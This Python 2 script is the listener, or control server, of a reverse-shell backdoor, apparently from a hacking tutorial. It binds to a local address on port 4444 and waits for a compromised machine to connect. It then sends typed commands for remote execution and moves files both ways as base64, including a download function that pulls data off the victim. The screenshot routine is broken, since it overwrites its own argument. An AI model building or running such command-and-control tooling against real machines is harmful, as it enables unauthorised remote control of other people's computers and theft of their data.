#!/usr/bin/env python

import socket,json, base64

class Listener:
    def __init__(self,ip,port):
        listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #change an option in object
        listner.bind((ip,port))#listen for incomming conncection
        listner.listen(0)#create similr to socket listen to incomming connection
        print('waiting for connection')
        self.connection,address=listner.accept()
        print('GOT A CONNECTION'+ str(address))

    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self,command):
        self.reliable_send(command)
        if command[0]=="exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self,path, content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+]Download Sucessful"

    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())

    def screenshot(self,image):
        with open(image,'wb') as image:
            image.write(base64.b64decode(image))
            return "[+]screenshot Sucessful"

    def run(self):
        while True:
            command = raw_input(">>")
            command = command.split(" ")
            if command[0] == 'upload':
                file_content = self.read_file(command[1])
                command.append(file_content) #['upload','file_name','content']
            result=self.execute_remotely(command)
            if command[0] == "download":
                result=self.write_file(command[1],result)
            print(result)

my_listner = Listener("192.168.0.104",4444)#ip address and port number of the machine
my_listner.run()